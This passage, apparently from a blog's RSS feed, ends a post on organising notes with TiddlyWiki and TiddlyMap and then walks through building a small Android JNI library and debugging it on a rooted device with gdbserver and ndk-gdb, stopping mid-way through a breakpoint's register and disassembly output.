<li>among these: <a href="http://tiddlywiki.com/#D3%20Plugin">D3 Plugin</a>, <a href="http://tiddlywiki.com/#Markdown%20Plugin">Markdown Plugin</a>, <a href="http://tiddlywiki.com/#KaTeX%20Plugin">KaTeX Plugin</a>,</li>
<li>you can easily write your own plugins</li>
</ul>
</li>
</ul>
<p>So this whole list is very promising. When I&rsquo;ve started looking for a suitable wiki, I wanted to keep things simple and don&rsquo;t over-engineer stuff. Having previously used <em>XMind</em> as my primary notes taking tool, I want to keep track of my notes in a more &ldquo;convenient&rdquo; way. I wanted to make &ldquo;relationships&rdquo; between my pieces of information and be able to extend it in a uncomplicated way. Then I&rsquo;ve found <em>TiddlyWiki</em>. And digging deeper I&rsquo;ve also found <a href="http://tiddlymap.org">TiddlyMap</a> a <strong>really</strong> cool way of <em>visualizing</em> the links between your tiddlers and not only.</p>
<p>With <em>TiddlyWiki</em> and <em>TiddlyMap</em> you&rsquo;ll get a nice overview not only of the content but also on inter-related topics:
<img src="/posts/img/2015/organize/5696b3eb316fac6e2b7460183a6dd97a.png" alt="TiddlyMap" title="TiddlyMap"></p>
<p>TiddlyMap will automatically create links between your tiddlers if it founds <em>links</em> in a tiddler:</p>
<p><img src="/posts/img/2015/organize/d9d7dd9bfad825475373bc6ebc3281b7.png" alt="TiddlyMap" title="Tiddly Map - Connections between interrelated tiddlers"></p>
<p>But you can also manually create links between your tiddlers:</p>
<p><img src="/posts/img/2015/organize/50359ca7124ff81f7fa5b8b1553dd517.png" alt="TiddlyMap - Connections" title="TiddlyMap - Connections"></p>
<h2 id="final-thoughts">Final thoughts</h2>
<p>Using all those tools on a regular basis I think each tool has its own specific features depending on your needs. There is <em>no</em> super tool and you should not try to rely on a single tool. I like Tiddly for organizing content but I think I won&rsquo;t save my bookmarks as a tiddler. There are better tools for this job (like <em>getpocket</em>). Try them out and judge for yourself.</p>
<p>And regarding <em>Tiddly</em> I&rsquo;ve found some interesting links (archived using <em>getpocket</em> ^^) you might have look at:</p>
<ul>
<li><a href="http://tw5magick.tiddlyspot.com">TW5 Magick</a></li>
<li><a href="http://iani.github.io/tw5square/">TiddlyWiki Squared</a></li>
<li><a href="http://thinkcreatesolve.biz/dGSD.html">dGSD - A GTD-based Task and Project Management Wiki</a></li>
<li><a href="http://d3tw.tiddlyspot.com">Visualisations with d3.js and others</a></li>
</ul>
<p>PS: This blog post was writen using Tiddly :)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Debugging Android native shared libraries</title>
      <link>https://blog.dornea.nu/2015/07/01/debugging-android-native-shared-libraries/</link>
      <pubDate>Wed, 01 Jul 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/07/01/debugging-android-native-shared-libraries/</guid>
      <content:encoded><![CDATA[<p>Since I haven&rsquo;t done this before, I thought I could share some experiences with you. All this began during some APK analysis which was heavily using <a href="https://en.wikipedia.org/wiki/Java_Native_Interface">JNI</a>s. In my particular case <em>Java Native Interfaces</em> were used to call functions inside libraries written in C/C++. At that time I was quite unfamiliar with JNIs and how they actually work. Besides that I haven&rsquo;t debugged any native applications/libraries on Android before. So this was the perfect opportunity to have a closer look at <a href="https://developer.android.com/tools/sdk/ndk/index.html">Android NDK</a> and its debugging features.</p>
<h2 id="create-eclipse-project">Create Eclipse project</h2>
<p>In this post I&rsquo;ll first create and build a <em>simple</em> Android project that includes native code using the <strong>JNI</strong>. As a main source I have used this extraordinary <a href="http://blog.edwards-research.com/2012/04/tutorial-android-jni/">Android JNI tutorial</a> which I highly appreciate. Following the instructions described in the post, I have managed to successfully create an empty Android project (File -&gt; New -&gt; Project -&gt; Android Application Project) for my purposes.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
tree -L <span style="color:#3677a9">1</span>
</code></pre></div><pre><code>.
â”œâ”€â”€ AndroidManifest.xml
â”œâ”€â”€ assets
â”œâ”€â”€ build.xml
â”œâ”€â”€ ic_launcher-web.png
â”œâ”€â”€ jni
â”œâ”€â”€ res
â””â”€â”€ src

4 directories, 3 files
</code></pre>
<p>And in <code>src</code> we have following <strong>classes</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%ls -lR src/com/example/jni_debug_demo
</code></pre></div><pre><code>src/com/example/jni_debug_demo:
total 8
-rw-r--r-- 1 victor users 1183 Jun 30 16:44 MainActivity.java
-rw-r--r-- 1 victor users  471 Jun 30 16:44 SquaredWrapper.java
</code></pre>
<h2 id="create-android-project">Create Android project</h2>
<p>In order to be able to build the APK, you&rsquo;ll have to create a new Android project:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
/home/victor/work/android-sdk/tools/android update project --target android-19 -p .
</code></pre></div><pre><code>Updated and renamed default.properties to project.properties
Updated local.properties
Added file ./proguard-project.txt
</code></pre>
<p>Now you should be able to <strong>build</strong> the project and also generate the <strong>APK</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
ant clean release | grep BUILD
</code></pre></div><pre><code>BUILD SUCCESSFUL
</code></pre>
<h2 id="add-jni-functionalities">Add JNI functionalities</h2>
<p>Now that we have the base Android project, let&rsquo;s add some <strong>JNI</strong> functionalities to the project. To compile the shared library (using gcc/g++) we&rsquo;ll need a valid C <strong>header</strong> which can be computed from <em>SquaredWrapper</em> (class used in previously mentioned tutorial).</p>
<h3 id="c-header">C header</h3>
<p>The compiled classes are now in &ldquo;<code>./bin/classes</code>&rdquo;. Let&rsquo;s generate the <strong>header</strong> files for <code>SquaredWrapper</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
javah -jni -classpath ~/work/android-sdk/platforms/android-19/android.jar:./bin/classes -o square.h com.example.jni_debug_demo.SquaredWrapper
cat square.h
</code></pre></div><pre><code>/* DO NOT EDIT THIS FILE - it is machine generated */
#include &lt;jni.h&gt;
/* Header for class com_example_jni_debug_demo_SquaredWrapper */

#ifndef _Included_com_example_jni_debug_demo_SquaredWrapper
#define _Included_com_example_jni_debug_demo_SquaredWrapper
#ifdef __cplusplus
extern &quot;C&quot; {
#endif
/*
 * Class:     com_example_jni_debug_demo_SquaredWrapper
 * Method:    squared
 * Signature: (I)I
 */
JNIEXPORT jint JNICALL Java_com_example_jni_1debug_1demo_SquaredWrapper_squared
  (JNIEnv *, jclass, jint);

#ifdef __cplusplus
}
#endif
#endif
</code></pre>
<p>So there is a function <strong>Java_com_example_jni_1debug_1demo_SquaredWrapper_squared</strong> (pay attention to the naming convention) which has 3 arguments. I won&rsquo;t discuss this further and I&rsquo;ll simple copy the file into a new folder <code>jni</code> inside the project:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
mkdir jni
mv square.h jni/
</code></pre></div><h3 id="c-source">C source</h3>
<p>Now that we have the <strong>function definition</strong> and the prototype generated by <code>javah</code> we can easily implement the <strong>C source</strong> as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%cat jni/square.c
</code></pre></div><pre><code>#include &quot;square.h&quot;
 
JNIEXPORT jint JNICALL Java_com_example_jni_1debug_1demo_SquaredWrapper_squared (JNIEnv * je, jclass jc, jint base)
{
    return (base*base);
}
</code></pre>
<p>So nothing special about it. Due to the introductory aspect of this post I&rsquo;ll try to keep things simple. You can of course go further and implement more complex functions.</p>
<h3 id="build-the-library">Build the library</h3>
<p>Create a <strong>Makefile</strong> for all the Android build tools.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%cat jni/Android.mk
</code></pre></div><pre><code>LOCAL_PATH := $(call my-dir)
 
include $(CLEAR_VARS)

LOCAL_LDLIBS := -llog

LOCAL_MODULE    := squared
LOCAL_SRC_FILES := square.c
 
include $(BUILD_SHARED_LIBRARY)
</code></pre>
<p>And now <strong>build</strong> the library (remember to set the <em>NDK_DEBUG</em> flag otherwise you won&rsquo;t be able to debug your native code):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#40ffff">NDK_DEBUG</span>=<span style="color:#3677a9">1</span> /home/victor/work/android-ndk-r10e/ndk-build 
readelf -h libs/armeabi/libsquared.so
</code></pre></div><pre><code>Android NDK: WARNING: APP_PLATFORM android-19 is larger than android:minSdkVersion 16 in ./AndroidManifest.xml    
[armeabi] Gdbserver      : [arm-linux-androideabi-4.8] libs/armeabi/gdbserver
[armeabi] Gdbsetup       : libs/armeabi/gdb.setup
[armeabi] Compile thumb  : squared &lt;= square.c
[armeabi] SharedLibrary  : libsquared.so
[armeabi] Install        : libsquared.so =&gt; libs/armeabi/libsquared.so
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Shared object file)
  Machine:                           ARM
  Version:                           0x1
  Entry point address:               0x0
  Start of program headers:          52 (bytes into file)
  Start of section headers:          12564 (bytes into file)
  Flags:                             0x5000000, Version5 EABI
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           40 (bytes)
  Number of section headers:         21
  Section header string table index: 20
</code></pre>
<h2 id="call-the-library">Call the library</h2>
<p>In <code>MainActivity</code> some static routines of the class <code>SquaredWrapper</code> are being called:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.java" data-lang=".java"><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">MainActivity</span> <span style="color:#6ab825;font-weight:bold">extends</span> Activity {
    <span style="color:#6ab825;font-weight:bold">private</span> EditText etInput;
    <span style="color:#6ab825;font-weight:bold">private</span> TextView txtTo2;
    <span style="color:#6ab825;font-weight:bold">private</span> TextView txtTo4;

	<span style="color:#ffa500">@Override</span>
	<span style="color:#6ab825;font-weight:bold">protected</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">onCreate</span>(Bundle savedInstanceState) {
		<span style="color:#6ab825;font-weight:bold">super</span>.<span style="color:#bbb">onCreate</span>(savedInstanceState);
		setContentView(R.<span style="color:#bbb">layout</span>.<span style="color:#bbb">activity_main</span>);
		
		<span style="color:#999;font-style:italic">// Define Input EditText, TextViews
</span><span style="color:#999;font-style:italic"></span>        etInput = (EditText) findViewById(R.<span style="color:#bbb">id</span>.<span style="color:#bbb">etInput</span>);
        txtTo2 =  (TextView) findViewById(R.<span style="color:#bbb">id</span>.<span style="color:#bbb">resTo2</span>);
        txtTo4 =  (TextView) findViewById(R.<span style="color:#bbb">id</span>.<span style="color:#bbb">resTo4</span>);
		
		<span style="color:#6ab825;font-weight:bold">int</span> b = 3;
        <span style="color:#6ab825;font-weight:bold">int</span> a = SquaredWrapper.<span style="color:#bbb">to4</span>(b);
        Log.<span style="color:#bbb">i</span>(<span style="color:#ed9d13">&#34;JNIDemo&#34;</span>, String.<span style="color:#bbb">format</span>(<span style="color:#ed9d13">&#34;%d-&gt;%d&#34;</span>, b,a));
	}
	
	<span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">cbCalculate</span>(View view) {
        <span style="color:#6ab825;font-weight:bold">int</span> in = 0;
        <span style="color:#6ab825;font-weight:bold">try</span>{
            in = Integer.<span style="color:#bbb">valueOf</span>( etInput.<span style="color:#bbb">getText</span>().<span style="color:#bbb">toString</span>() );
        } <span style="color:#6ab825;font-weight:bold">catch</span>(NumberFormatException e) { 
        	<span style="color:#6ab825;font-weight:bold">return</span> ; 
        }
         
        txtTo2.<span style="color:#bbb">setText</span>(String.<span style="color:#bbb">format</span>(<span style="color:#ed9d13">&#34;%d&#34;</span>, SquaredWrapper.<span style="color:#bbb">squared</span>(in)));
        txtTo4.<span style="color:#bbb">setText</span>(String.<span style="color:#bbb">format</span>(<span style="color:#ed9d13">&#34;%d&#34;</span>, SquaredWrapper.<span style="color:#bbb">to4</span>(in)));
    }
}
</code></pre></div><p>Build the project again:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
ant clean release | grep -e <span style="color:#ed9d13">&#34;^BUILD&#34;</span>
</code></pre></div><pre><code>BUILD SUCCESSFUL
</code></pre>
<h2 id="run-the-demo-application">Run the demo application</h2>
<p>First let&rsquo;s build the APK with <strong>debug</strong> enabled and sign it using a debug key:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
ant clean debug | grep -e <span style="color:#ed9d13">&#34;^BUILD&#34;</span>
</code></pre></div><pre><code>BUILD SUCCESSFUL
</code></pre>
<p>Now you can <strong>install</strong> <code>./bin/MainActivity-debug.apk</code> on your Android device (whether virtual or real)</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
/home/victor/work/android-sdk/platform-tools/adb devices
</code></pre></div><pre><code>List of devices attached 
0123456789ABCDEF	device
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
adb install ./bin/MainActivity-debug.apk 2&gt; /dev/null
</code></pre></div><pre><code>WARNING: linker: libvc1dec_sa.ca7.so has text relocations. This is wasting memory and is a security risk. Please fix.
WARNING: linker: libvc1dec_sa.ca7.so has text relocations. This is wasting memory and is a security risk. Please fix.
	pkg: /data/local/tmp/MainActivity-debug.apk
Success
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash 
adb shell am start -n com.example.jni_debug_demo/com.example.jni_debug_demo.MainActivity
</code></pre></div><pre><code>WARNING: linker: libvc1dec_sa.ca7.so has text relocations. This is wasting memory and is a security risk. Please fix.
WARNING: linker: libvc1dec_sa.ca7.so has text relocations. This is wasting memory and is a security risk. Please fix.
Starting: Intent { cmp=com.example.jni_debug_demo/.MainActivity }
</code></pre>
<p><img src="/posts/img/2015/android-solib/a74f0e9adca736086c2834fb63c793ad.png" alt="JNI Debug Demo Application"></p>
<p>Greping for the <strong>logcat messages</strong> shows:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ adb logcat -s JNIDemo
--------- beginning of /dev/log/system
--------- beginning of /dev/log/main
I/JNIDemo ( 5524): 3-&gt;81
I/JNIDemo ( 5524): 3-&gt;81
I/JNIDemo ( 5524): 3-&gt;81
^C
</code></pre></div><h2 id="debug-the-application">Debug the application</h2>
<p>For the next steps a <strong>rooted</strong> device is <em>required</em>. Besides that you should install the <em>Android NDK</em> if you haven&rsquo;t done this yet.</p>
<h3 id="remount-system-as-rw">Remount /system as rw</h3>
<p>First you&rsquo;ll have to <em>mount</em> <code>/system</code> with read-write rights:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
adb shell mount | grep -e <span style="color:#ed9d13">&#34;system&#34;</span>
</code></pre></div><pre><code>/emmc@android /system ext4 ro,seclabel,noatime,noauto_da_alloc,commit=1,data=ordered 0 0
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
adb shell <span style="color:#ed9d13">&#34;su -c &#39;mount -o rw,remount /system&#39;&#34;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
adb shell mount | grep -e <span style="color:#ed9d13">&#34;system&#34;</span>
</code></pre></div><pre><code>/emmc@android /system ext4 rw,seclabel,relatime,noauto_da_alloc,commit=1,data=ordered 0 0
</code></pre>
<h3 id="copy-gdbserver-to-device">Copy gdbserver to device</h3>
<p>Now you&rsquo;ll have to copy the <strong>gdbserver</strong> from the Android NDK into <code>/system/bin</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
find /home/victor/work/android-ndk-r10e/ -type f -name <span style="color:#ed9d13">&#34;gdbserver&#34;</span>
</code></pre></div><pre><code>/home/victor/work/android-ndk-r10e/prebuilt/android-mips/gdbserver/gdbserver
/home/victor/work/android-ndk-r10e/prebuilt/android-x86_64/gdbserver/gdbserver
/home/victor/work/android-ndk-r10e/prebuilt/android-arm64/gdbserver/gdbserver
/home/victor/work/android-ndk-r10e/prebuilt/android-x86/gdbserver/gdbserver
/home/victor/work/android-ndk-r10e/prebuilt/android-mips64/gdbserver/gdbserver
/home/victor/work/android-ndk-r10e/prebuilt/android-arm/gdbserver/gdbserver
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
adb shell cat /proc/cpuinfo | grep -e <span style="color:#ed9d13">&#34;Processor&#34;</span>
</code></pre></div><pre><code>Processor	: ARMv7 Processor rev 3 (v7l)
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
adb push /home/victor/work/android-ndk-r10e/prebuilt/android-arm/gdbserver/gdbserver /mnt/sdcard/tmp 2&gt; /dev/null
adb shell <span style="color:#ed9d13">&#34;su -c &#39;cp /mnt/sdcard/tmp/gdbserver /system/bin/&#39;&#34;</span>
</code></pre></div><h3 id="copy-arm-libraries-to-your-client">Copy ARM libraries to your client</h3>
<p>In order to be able to find debug information/symbols you&rsquo;ll need  all ARM libraries all your device/emulator to be copied to your PC. <code>gdb</code> will need them later on.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
mkdir system_lib
<span style="color:#24909d">cd</span> system_lib
adb pull /system/lib 2&gt; /dev/null
</code></pre></div><h3 id="run-the-application">Run the application</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
adb shell am start -n com.example.jni_debug_demo/com.example.jni_debug_demo.MainActivity
</code></pre></div><pre><code>WARNING: linker: libvc1dec_sa.ca7.so has text relocations. This is wasting memory and is a security risk. Please fix.
WARNING: linker: libvc1dec_sa.ca7.so has text relocations. This is wasting memory and is a security risk. Please fix.
Starting: Intent { cmp=com.example.jni_debug_demo/.MainActivity }
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
adb shell ps | grep jni_debug_demo
</code></pre></div><pre><code>u0_a159   28054 135   554400 14484 ffffffff 00000000 S com.example.jni_debug_demo
</code></pre>
<p>Now that the app is running we&rsquo;re ready to start the debugger and attach it to the process ID <em>28054</em>.</p>
<h3 id="attach-gdb-to-process">Attach gdb to process</h3>
<p>In project&rsquo;s root directory you&rsquo;ll run <code>ndk-gdb</code> which is part of the <em>Android NDK</em> package.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
ndk-gdb --verbose &gt; /dev/null
</code></pre></div><pre><code>warning: Could not load shared library symbols for 108 libraries, e.g. libstdc++.so.
Use the &quot;info sharedlibrary&quot; command to see the complete listing.
Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?
</code></pre>
<p>Without paying attention to the <em>warning</em> message, here are the steps <code>ndk-gdb</code> will do for you</p>
<ul>
<li>check if application is running</li>
<li>setup network redirection (port forwarding)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">adb_cmd forward tcp:5039 localfilesystem:/data/data/com.example.jni_debug_demo/debug-socket
</code></pre></div><ul>
<li>pull several utilities (app_process, linker) from the device/emulator</li>
<li>start <code>gdb</code></li>
<li>attach to the process</li>
</ul>
<p>One could of course do all these steps <strong>manually</strong>.</p>
<ol>
<li>Do port <em>forwarding</em>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">\\( adb forward tcp:1337 tcp:1337
</code></pre></div><ol>
<li>Attach <code>gdbserver</code> to the process (on the device)</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@Android:/ # ps | grep jni
u0\_a159   28054 135   561056 14100 ffffffff 400a499c S com.example.jni\_debug\_demo
root@Android:/ # gdbserver :1337 --attach 28054                                
Attached; pid = 28054
Listening on port 1337

</code></pre></div><ol start="2">
<li>Connect gdb <code>client</code> to the server:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">\\) /home/victor/work/android-ndk-r10e/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin/arm-linux-androideabi-gdb
...
&gt; target remote :1337
...
</code></pre></div><p>But I still recommend using <code>ndk-gdb</code>.</p>
<h3 id="read-debugging-information">Read debugging information</h3>
<p>And now let&rsquo;s go back to the previously mentioned <code>warning</code> message:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">warning: Could not load shared library symbols for 108 libraries, e.g. libstdc++.so.
</code></pre></div><p><code>gdb</code> is telling us that it can&rsquo;t find any <strong>debugging symbols</strong> for the loaded (ARM) libraries. In that case we&rsquo;ll have to specify the <strong>path</strong> where it can find that information:</p>
<ul>
<li><code>system_lib</code>: contains all ARM libraries from the device (/system/lib)</li>
<li><code>obj/local/armeabi</code>: contains debugging information about <code>libsquared.so</code> (our target)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ndk-gdb --verbose
...
gef&gt; set solib-search-path system_lib/:obj/local/armeabi/
Reading symbols from system_lib/libc.so...(no debugging symbols found)...done.
Loaded symbols for system_lib/libc.so
Reading symbols from system_lib/libstdc++.so...(no debugging symbols found)...done.
Loaded symbols for system_lib/libstdc++.so
Reading symbols from system_lib/libm.so...(no debugging symbols found)...done.
Loaded symbols for system_lib/libm.so
Reading symbols from system_lib/liblog.so...(no debugging symbols found)...done.
Loaded symbols for system_lib/liblog.so
Reading symbols from system_lib/libcutils.so...(no debugging symbols found)...done.
...

</code></pre></div><p>You can now <strong>verify</strong> the debugging information via <code>info sharedlibrary</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef&gt; info sharedlibrary
From        To          Syms Read   Shared Object Library
0x40053a80  0x400619e8  Yes (*)     /home/victor/workspace/jni_debug_demo/obj/local/armeabi/linker
0x4008c500  0x400d2e54  Yes (*)     /home/victor/workspace/jni_debug_demo/system_lib/libc.so
0x400f4828  0x400f49ec  Yes (*)     /home/victor/workspace/jni_debug_demo/system_lib/libstdc++.so
0x400f9940  0x4010d5b8  Yes (*)     /home/victor/workspace/jni_debug_demo/system_lib/libm.so
0x4007a190  0x4007bdf8  Yes (*)     /home/victor/workspace/jni_debug_demo/system_lib/liblog.so
0x4006f6c8  0x40074ac4  Yes (*)     /home/victor/workspace/jni_debug_demo/system_lib/libcutils.so
0x4012eb1c  0x40131210  Yes (*)     /home/victor/workspace/jni_debug_demo/system_lib/libgccdemangle.so
0x40142bf0  0x40152a84  Yes (*)     /home/victor/workspace/jni_debug_demo/system_lib/libz.so
...
0x60b5bbe4  0x60b5d174  Yes         /home/victor/workspace/jni_debug_demo/obj/local/armeabi/libsquared.so
                        No          gralloc.mt6582.so
(*): Shared library is missing debugging information.
</code></pre></div><h3 id="find-target-function">Find target function</h3>
<p>From last output you can see that <code>libsquared.so</code> starts at address <strong>0x60b5bbe4</strong>. Let&rsquo;s see what we can find there:</p>
<p><img src="/posts/img/2015/android-solib/b85df1e566b46ed748e315c3d4f043ed.png" alt="jni_debug_demo libsquared"></p>
<p>Bingo! So <code>Java_com_example_jni_1debug_1demo_SquaredWrapper_squared</code> starts at <strong>0x60b5bc28</strong>. We&rsquo;ll definitely set a <strong>breakpoint</strong> at that address:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef&gt; b Java_com_example_jni_1debug_1demo_SquaredWrapper_squared
Breakpoint 1 at 0x60b5bc40: file jni/square.c, line 5.
gef&gt;
</code></pre></div><h3 id="trigger-and-debug-function">Trigger and debug function</h3>
<p>For the targeted function to be executed we&rsquo;ll have to trigger its execution by clicking on the &ldquo;Calculate&rdquo; button in the UI. <strong>Before</strong> doing that you should tell <code>gdb</code> to <em>continue</em> execution:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef&gt; continue
Continuing.
</code></pre></div><p>After having pressed the button in the UI, you should see sth similar to this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef&gt; continue
Continuing.
--------------------------------------------------------------------------------[regs]
\\(r0    0x4187fe30 \\)r1    0x7a100019 \\(r2    0x00000008 \\)r3    0x578bbd18 
\\(r4    0x57c49258 \\)r5    0x41882860 \\(r6    0x00000004 \\)r7    0x578bbccc 
\\(r8    0xbed1e2a8 \\)r9    0x578bbcc4 \\(r10   0x41882870 \\)r11   0xbed1e2a4 
\\(r12   0x60b5bc28 \\)sp    0xbed1e290 \\(lr    0x418a1750 \\)pc    0x60b5bc40 

--------------------------------------------------------------------------------[stack]
0xbed1e290: 
0xbed1e294: 
0xbed1e298: 
0xbed1e29c: 
0xbed1e2a0: 
0xbed1e2a4: 
0xbed1e2a8: 
0xbed1e2ac: 
0xbed1e2b0: 
0xbed1e2b4: 
--------------------------------------------------------------------------------[code]
0x60b5bc2c       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+4&gt;:  add     r11, sp, #0
0x60b5bc30       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+8&gt;:  sub     sp, sp, #20
0x60b5bc34       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+12&gt;: str     r0, [r11, #-8]
0x60b5bc38       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+16&gt;: str     r1, [r11, #-12]
0x60b5bc3c       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+20&gt;: str     r2, [r11, #-16]
0x60b5bc40       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+24&gt;: ldr     r3, [r11, #-16] &lt;&lt;= 
0x60b5bc44       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+28&gt;: ldr     r2, [r11, #-16]
0x60b5bc48       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+32&gt;: mul     r3, r2, r3
0x60b5bc4c       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+36&gt;: mov     r0, r3
0x60b5bc50       &lt;Java_com_example_jni_1debug_1demo_SquaredWrapper_squared+40&gt;: sub     sp, r11, #0
--------------------------------------------------------------------------------[trace]
